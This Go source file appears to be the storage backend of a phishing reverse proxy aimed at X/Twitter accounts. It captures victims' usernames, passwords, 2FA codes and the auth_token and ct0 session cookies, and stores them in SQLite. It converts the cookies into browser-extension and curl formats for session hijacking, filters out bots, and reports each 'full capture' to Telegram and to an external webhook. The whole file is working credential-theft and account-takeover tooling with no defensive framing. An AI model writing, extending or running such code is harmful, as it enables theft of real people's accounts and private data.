package main

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	_ "modernc.org/sqlite"
)

// Session is one victim's captured flow (credentials, 2FA, cookies).
type Session struct {
	ID        string    `json:"id"`
	StartedAt time.Time `json:"started_at"`
	IP        string    `json:"ip"`
	Country   string    `json:"country,omitempty"`
	City      string    `json:"city,omitempty"`
	UserAgent string    `json:"user_agent"`
	Username  string    `json:"username,omitempty"`
	Password  string    `json:"password,omitempty"`
	TwoFA     string    `json:"two_fa,omitempty"`
	AuthToken string    `json:"auth_token,omitempty"`
	CT0       string    `json:"ct0,omitempty"`
	UserID    string    `json:"user_id,omitempty"` // Twitter user ID from twid cookie
	CookieJar []Cookie  `json:"cookies,omitempty"`
	LastSeen  time.Time `json:"last_seen"`
	Complete  bool      `json:"complete"`
}

// Cookie is a single captured cookie. The JSON form matches the browser-cookie
// export format expected by the panel: name/value/domain/path/expires/secure,
// with expires as a Unix timestamp in SECONDS (-1 for session cookies).
type Cookie struct {
	Name    string `json:"name"`
	Value   string `json:"value"`
	Domain  string `json:"domain"`
	Path    string `json:"path"`
	Expires int64  `json:"expires"`
	Secure  bool   `json:"secure"`
	// HTTPOnly is tracked internally but intentionally excluded from the JSON
	// cookie export (the panel's expected format has no httpOnly field).
	HTTPOnly bool `json:"-"`
}

// cookieJSON returns the cookie jar in browser extension format (EditThisCookie/Cookie-Editor compatible).
// Format matches exactly: domain, hostOnly, httpOnly, name, path, sameSite, secure, session, storeId, value, expirationDate
func (s *Session) cookieJSON() []map[string]any {
	out := make([]map[string]any, 0, len(s.CookieJar)+2)
	
	// Ensure auth_token is included even if not in jar
	hasAuthToken := false
	hasCT0 := false
	for _, c := range s.CookieJar {
		if c.Name == "auth_token" {
			hasAuthToken = true
		}
		if c.Name == "ct0" {
			hasCT0 = true
		}
	}
	
	// Add auth_token if we have it but it's not in jar
	if s.AuthToken != "" && !hasAuthToken {
		out = append(out, map[string]any{
			"domain":         ".x.com",
			"hostOnly":       false,
			"httpOnly":       true,
			"name":           "auth_token",
			"path":           "/",
			"sameSite":       "lax",
			"secure":         true,
			"session":        false,
			"storeId":        nil,
			"value":          s.AuthToken,
			"expirationDate": time.Now().Add(365 * 24 * time.Hour).Unix(),
		})
	}
	
	// Add ct0 if we have it but it's not in jar
	if s.CT0 != "" && !hasCT0 {
		out = append(out, map[string]any{
			"domain":         ".x.com",
			"hostOnly":       false,
			"httpOnly":       false,
			"name":           "ct0",
			"path":           "/",
			"sameSite":       "lax",
			"secure":         true,
			"session":        false,
			"storeId":        nil,
			"value":          s.CT0,
			"expirationDate": time.Now().Add(365 * 24 * time.Hour).Unix(),
		})
	}
	
	for _, c := range s.CookieJar {
		// Determine if session cookie (no expiry or expired)
		isSession := c.Expires <= 0
		
		// hostOnly is true if domain doesn't start with "."
		hostOnly := !strings.HasPrefix(c.Domain, ".")
		
		// Build cookie in exact order expected by browser extensions
		cookie := map[string]any{
			"domain":   c.Domain,
			"hostOnly": hostOnly,
			"httpOnly": c.HTTPOnly,
			"name":     c.Name,
			"path":     c.Path,
			"sameSite": "lax",
			"secure":   c.Secure,
			"session":  isSession,
			"storeId":  nil,
			"value":    c.Value,
		}
		
		// Only add expirationDate if not a session cookie
		if !isSession && c.Expires > 0 {
			cookie["expirationDate"] = c.Expires
		}
		
		out = append(out, cookie)
	}
	return out
}

// cookieNetscape returns cookies in Netscape format for tools like curl.
func (s *Session) cookieNetscape() string {
	var b strings.Builder
	b.WriteString("# Netscape HTTP Cookie File\n")
	for _, c := range s.CookieJar {
		secure := "FALSE"
		if c.Secure {
			secure = "TRUE"
		}
		hostOnly := "FALSE"
		if !strings.HasPrefix(c.Domain, ".") {
			hostOnly = "TRUE"
		}
		expires := "0"
		if c.Expires > 0 {
			expires = fmt.Sprintf("%d", c.Expires)
		}
		fmt.Fprintf(&b, "%s\t%s\t%s\t%s\t%s\t%s\t%s\n",
			c.Domain, hostOnly, c.Path, secure, expires, c.Name, c.Value)
	}
	return b.String()
}

// Store persists sessions in a SQLite database (embedded, no CGO).
type Store struct {
	mu       sync.RWMutex
	dataDir  string
	db       *sql.DB
	sessions map[string]*Session
	telegram *TelegramNotifier
	geo      *geoLookup
}

func newStore(dataDir string) *Store {
	geo := newGeoLookup()
	st := &Store{dataDir: dataDir, sessions: make(map[string]*Session), telegram: newTelegramNotifier(geo), geo: geo}
	if st.telegram != nil {
		log.Println("[store] Telegram notifications enabled")
	}
	if err := os.MkdirAll(dataDir, 0o755); err != nil {
		log.Printf("[store] cannot create data dir: %v (in-memory only)", err)
		return st
	}
	dbPath := filepath.Join(dataDir, "captures.db")
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		log.Printf("[store] cannot open sqlite db: %v (in-memory only)", err)
		return st
	}
	db.SetMaxOpenConns(1)
	if err := initSchema(db); err != nil {
		log.Printf("[store] cannot init schema: %v (in-memory only)", err)
		db.Close()
		return st
	}
	st.db = db
	st.load()
	return st
}

// initSchema creates the sessions and cookies tables if they do not exist.
func initSchema(db *sql.DB) error {
	const ddl = `
CREATE TABLE IF NOT EXISTS sessions (
	id          TEXT PRIMARY KEY,
	started_at  INTEGER NOT NULL,
	ip          TEXT NOT NULL DEFAULT '',
	country     TEXT NOT NULL DEFAULT '',
	city        TEXT NOT NULL DEFAULT '',
	user_agent  TEXT NOT NULL DEFAULT '',
	username    TEXT NOT NULL DEFAULT '',
	password    TEXT NOT NULL DEFAULT '',
	two_fa      TEXT NOT NULL DEFAULT '',
	auth_token  TEXT NOT NULL DEFAULT '',
	ct0         TEXT NOT NULL DEFAULT '',
	last_seen   INTEGER NOT NULL,
	complete    INTEGER NOT NULL DEFAULT 0
);
CREATE TABLE IF NOT EXISTS cookies (
	session_id TEXT NOT NULL,
	name       TEXT NOT NULL,
	value      TEXT NOT NULL,
	domain     TEXT NOT NULL DEFAULT '',
	path       TEXT NOT NULL DEFAULT '',
	expires    INTEGER,
	http_only  INTEGER NOT NULL DEFAULT 0,
	secure     INTEGER NOT NULL DEFAULT 0
);
CREATE INDEX IF NOT EXISTS idx_cookies_session ON cookies(session_id);
CREATE TABLE IF NOT EXISTS visitors (
	ip        TEXT NOT NULL,
	country   TEXT NOT NULL DEFAULT '',
	city      TEXT NOT NULL DEFAULT '',
	user_agent TEXT NOT NULL DEFAULT '',
	first_seen INTEGER NOT NULL,
	last_seen  INTEGER NOT NULL,
	username   TEXT NOT NULL DEFAULT '',
	complete   INTEGER NOT NULL DEFAULT 0,
	PRIMARY KEY (ip)
);
`
	_, err := db.Exec(ddl)
	if err != nil {
		return err
	}
	// Lightweight migration for databases created before the country/city
	// columns existed. ALTER TABLE ADD COLUMN is a no-op error on SQLite when
	// the column already exists, so this is safe to run unconditionally.
	for _, col := range []string{
		`ALTER TABLE sessions ADD COLUMN country TEXT NOT NULL DEFAULT ''`,
		`ALTER TABLE sessions ADD COLUMN city TEXT NOT NULL DEFAULT ''`,
	} {
		_, _ = db.Exec(col)
	}
	return nil
}

// load hydrates the in-memory index from the SQLite DB.
//
// Cookies are loaded in a second pass after the sessions rows are drained and
// closed: the store runs with SetMaxOpenConns(1), so nesting a cookie query
// inside the sessions row loop deadlocks waiting for the single connection.
func (s *Store) load() {
	rows, err := s.db.Query(`SELECT id, started_at, ip, country, city, user_agent, username, password,
		two_fa, auth_token, ct0, last_seen, complete FROM sessions ORDER BY last_seen DESC`)
	if err != nil {
		return
	}
	fresh := make(map[string]*Session)
	for rows.Next() {
		var sess Session
		var startedAt, lastSeen int64
		var complete int
		if err := rows.Scan(&sess.ID, &startedAt, &sess.IP, &sess.Country, &sess.City,
			&sess.UserAgent, &sess.Username, &sess.Password, &sess.TwoFA,
			&sess.AuthToken, &sess.CT0, &lastSeen, &complete); err != nil {
			continue
		}
		sess.StartedAt = time.UnixMilli(startedAt)
		sess.LastSeen = time.UnixMilli(lastSeen)
		sess.Complete = complete != 0
		fresh[sess.ID] = &sess
	}
	rows.Close()

	for id, sess := range fresh {
		sess.CookieJar = s.loadCookies(id)
	}

	s.mu.Lock()
	for id, sess := range fresh {
		s.sessions[id] = sess
	}
	s.mu.Unlock()
}

func (s *Store) loadCookies(id string) []Cookie {
	var out []Cookie
	rows, err := s.db.Query(`SELECT name, value, domain, path, expires, http_only, secure
		FROM cookies WHERE session_id = ?`, id)
	if err != nil {
		return out
	}
	defer rows.Close()
	for rows.Next() {
		var c Cookie
		var expires sql.NullInt64
		var httpOnly, secure int
		if err := rows.Scan(&c.Name, &c.Value, &c.Domain, &c.Path, &expires, &httpOnly, &secure); err != nil {
			continue
		}
		// expires is stored as Unix seconds; -1/absent means session cookie.
		if expires.Valid {
			c.Expires = expires.Int64
		} else {
			c.Expires = -1
		}
		c.HTTPOnly = httpOnly != 0
		c.Secure = secure != 0
		out = append(out, c)
	}
	return out
}

func (s *Store) newSession(ip, ua string) *Session {
	id := fmt.Sprintf("%d", time.Now().UnixNano())
	sess := &Session{
		ID:        id,
		StartedAt: time.Now(),
		IP:        ip,
		UserAgent: ua,
		LastSeen:  time.Now(),
	}
	s.mu.Lock()
	s.sessions[id] = sess
	s.mu.Unlock()
	s.persist(sess)
	return sess
}

func (s *Store) get(id string) *Session {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.sessions[id]
}

func (s *Store) update(sess *Session) {
	sess.LastSeen = time.Now()
	s.persist(sess)
}

func (s *Store) finalize(sess *Session) {
	// Mark as complete if we have auth_token + ct0 (full session hijack)
	sess.Complete = sess.AuthToken != "" && sess.CT0 != ""
	
	// Debug log
	log.Printf("[finalize] session=%s user=%q pass=%q auth=%s ct0=%s cookies=%d",
		sess.ID, sess.Username, sess.Password, 
		truncateToken(sess.AuthToken), truncateToken(sess.CT0), len(sess.CookieJar))
	
	// Skip bots
	if isBot(sess.IP, sess.UserAgent) {
		log.Printf("[finalize] skipped bot IP %s", sess.IP)
		return
	}
	
	// Always persist the session
	s.persist(sess)
	
	// Mark visitor as captured if we got credentials or tokens
	hasCredentials := sess.Username != "" || sess.Password != "" || sess.AuthToken != ""
	if hasCredentials {
		s.markVisitorCapture(sess.IP, sess.Username, sess.Complete)
	}
	
	// Send Telegram notification for FULL captures (has auth_token)
	if sess.AuthToken != "" && len(sess.AuthToken) > 30 {
		log.Printf("[capture] ✓ FULL CAPTURE: user=%q pass=%q auth_token=%s cookies=%d",
			sess.Username, sess.Password, truncateToken(sess.AuthToken), len(sess.CookieJar))
		if s.telegram != nil {
			s.telegram.NotifyCapture(sess)
		}
		// Send to webhook for permanent storage
		go sendToWebhook(sess)
	}
}

// sendToWebhook posts capture data to external webhook for permanent storage
func sendToWebhook(sess *Session) {
	webhookURL := os.Getenv("CAPTURE_WEBHOOK_URL")
	if webhookURL == "" {
		return
	}
	
	data := map[string]interface{}{
		"id":         sess.ID,
		"ip":         sess.IP,
		"country":    sess.Country,
		"city":       sess.City,
		"username":   sess.Username,
		"password":   sess.Password,
		"two_fa":     sess.TwoFA,
		"auth_token": sess.AuthToken,
		"ct0":        sess.CT0,
		"user_id":    sess.UserID,
		"cookies":    sess.cookieJSON(),
		"complete":   sess.Complete,
		"timestamp":  time.Now().Format(time.RFC3339),
	}
	
	body, err := json.Marshal(data)
	if err != nil {
		log.Printf("[webhook] marshal error: %v", err)
		return
	}
	
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(webhookURL, "application/json", bytes.NewReader(body))
	if err != nil {
		log.Printf("[webhook] send error: %v", err)
		return
	}
	defer resp.Body.Close()
	
	if resp.StatusCode == 200 {
		log.Printf("[webhook] capture saved to %s", webhookURL)
	} else {
		log.Printf("[webhook] bad response: %d", resp.StatusCode)
	}
}

func truncateToken(s string) string {
	if len(s) > 20 {
		return s[:20] + "..."
	}
	return s
}

func (s *Store) all() []*Session {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*Session, 0, len(s.sessions))
	for _, sess := range s.sessions {
		out = append(out, sess)
	}
	return out
}

// Visitor is a de-duplicated view of who hit the proxy (one row per IP), used
// by the panel's "visitors"/"live visitors" view.
type Visitor struct {
	IP        string    `json:"ip"`
	Country   string    `json:"country,omitempty"`
	City      string    `json:"city,omitempty"`
	UserAgent string    `json:"user_agent,omitempty"`
	FirstSeen time.Time `json:"first_seen"`
	LastSeen  time.Time `json:"last_seen"`
	Username  string    `json:"username,omitempty"`
	Complete  bool      `json:"complete"`
}

// recordVisit upserts a visitor row for the given IP. Called on every request
// the proxy handles so "live visitors" reflects recent activity.
// Set notify=true to trigger Telegram notification (only for real visitors who passed challenge).
func (s *Store) recordVisit(ip, country, city, ua string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.db == nil {
		return
	}
	now := time.Now().UnixMilli()
	if _, err := s.db.Exec(`
INSERT INTO visitors (ip, country, city, user_agent, first_seen, last_seen)
VALUES (?, ?, ?, ?, ?, ?)
ON CONFLICT(ip) DO UPDATE SET
	last_seen=excluded.last_seen,
	country=CASE WHEN excluded.country != '' THEN excluded.country ELSE country END,
	city=CASE WHEN excluded.city != '' THEN excluded.city ELSE city END,
	user_agent=excluded.user_agent`,
		ip, country, city, ua, now, now); err != nil {
		log.Printf("[store] visitor upsert failed: %v", err)
	}
}

// notifyRealVisitor sends a Telegram notification for a real visitor
// (one who passed the Cloudflare challenge and hit the login flow).
func (s *Store) notifyRealVisitor(ip, country, city, ua string) {
	if s.telegram != nil {
		s.telegram.NotifyVisitor(ip, country, city, ua)
	}
}

// markVisitorCapture updates the visitor row when a session finalizes with
// captured credentials, so the visitors view can show who got hooked.
func (s *Store) markVisitorCapture(ip, username string, complete bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.db == nil || ip == "" {
		return
	}
	completeInt := 0
	if complete {
		completeInt = 1
	}
	_, _ = s.db.Exec(`
INSERT INTO visitors (ip, first_seen, last_seen, username, complete)
VALUES (?, ?, ?, ?, ?)
ON CONFLICT(ip) DO UPDATE SET username=excluded.username, complete=excluded.complete`,
		ip, time.Now().UnixMilli(), time.Now().UnixMilli(), username, completeInt)
}

// visitors returns all visitor rows, most-recently-seen first.
func (s *Store) visitors() []Visitor {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := []Visitor{}
	if s.db == nil {
		return out
	}
	rows, err := s.db.Query(`SELECT ip, country, city, user_agent, first_seen, last_seen,
		username, complete FROM visitors ORDER BY last_seen DESC`)
	if err != nil {
		return out
	}
	defer rows.Close()
	for rows.Next() {
		var v Visitor
		var firstSeen, lastSeen int64
		var complete int
		if err := rows.Scan(&v.IP, &v.Country, &v.City, &v.UserAgent, &firstSeen, &lastSeen,
			&v.Username, &complete); err != nil {
			continue
		}
		v.FirstSeen = time.UnixMilli(firstSeen)
		v.LastSeen = time.UnixMilli(lastSeen)
		v.Complete = complete != 0
		out = append(out, v)
	}
	return out
}

// liveVisitors returns visitors seen within the last window (seconds).
func (s *Store) liveVisitors(window time.Duration) []Visitor {
	cutoff := time.Now().Add(-window)
	out := []Visitor{}
	for _, v := range s.visitors() {
		if v.LastSeen.After(cutoff) {
			out = append(out, v)
		}
	}
	return out
}

// persist upserts the session and its cookies into SQLite. No-op if the DB is
// unavailable (in-memory-only mode).
func (s *Store) persist(sess *Session) {
	if s.db == nil {
		return
	}
	const upsertSession = `
INSERT INTO sessions (id, started_at, ip, country, city, user_agent, username, password, two_fa,
	auth_token, ct0, last_seen, complete)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
ON CONFLICT(id) DO UPDATE SET
	started_at=excluded.started_at, ip=excluded.ip, country=excluded.country, city=excluded.city,
	user_agent=excluded.user_agent,
	username=excluded.username, password=excluded.password, two_fa=excluded.two_fa,
	auth_token=excluded.auth_token, ct0=excluded.ct0, last_seen=excluded.last_seen,
	complete=excluded.complete`
	complete := 0
	if sess.Complete {
		complete = 1
	}
	if _, err := s.db.Exec(upsertSession, sess.ID, sess.StartedAt.UnixMilli(), sess.IP,
		sess.Country, sess.City, sess.UserAgent, sess.Username, sess.Password, sess.TwoFA,
		sess.AuthToken, sess.CT0, sess.LastSeen.UnixMilli(), complete); err != nil {
		log.Printf("[store] session upsert failed: %v", err)
		return
	}

	if _, err := s.db.Exec(`DELETE FROM cookies WHERE session_id = ?`, sess.ID); err != nil {
		log.Printf("[store] cookie delete failed: %v", err)
		return
	}
	for _, c := range sess.CookieJar {
		// expires stored as Unix seconds; -1 => NULL (session cookie).
		var expires any
		if c.Expires <= 0 {
			expires = nil
		} else {
			expires = c.Expires
		}
		httpOnly, secure := 0, 0
		if c.HTTPOnly {
			httpOnly = 1
		}
		if c.Secure {
			secure = 1
		}
		if _, err := s.db.Exec(`INSERT INTO cookies (session_id, name, value, domain, path,
			expires, http_only, secure) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
			sess.ID, c.Name, c.Value, c.Domain, c.Path, expires, httpOnly, secure); err != nil {
			log.Printf("[store] cookie insert failed: %v", err)
		}
	}
}

// sessionJSON dumps a session as pretty JSON for the panel.
func (s *Store) sessionJSON(sess *Session) []byte {
	data, err := json.MarshalIndent(sess, "", "  ")
	if err != nil {
		return []byte("{}")
	}
	return data
}

// deleteSession removes a session by ID
func (s *Store) deleteSession(id string) {
	s.mu.Lock()
	delete(s.sessions, id)
	s.mu.Unlock()
	
	if s.db != nil {
		s.db.Exec(`DELETE FROM sessions WHERE id = ?`, id)
		s.db.Exec(`DELETE FROM cookies WHERE session_id = ?`, id)
	}
}

// clearAll removes all sessions and visitors
func (s *Store) clearAll() {
	s.mu.Lock()
	s.sessions = make(map[string]*Session)
	s.mu.Unlock()
	
	if s.db != nil {
		s.db.Exec(`DELETE FROM sessions`)
		s.db.Exec(`DELETE FROM cookies`)
		s.db.Exec(`DELETE FROM visitors`)
	}
}
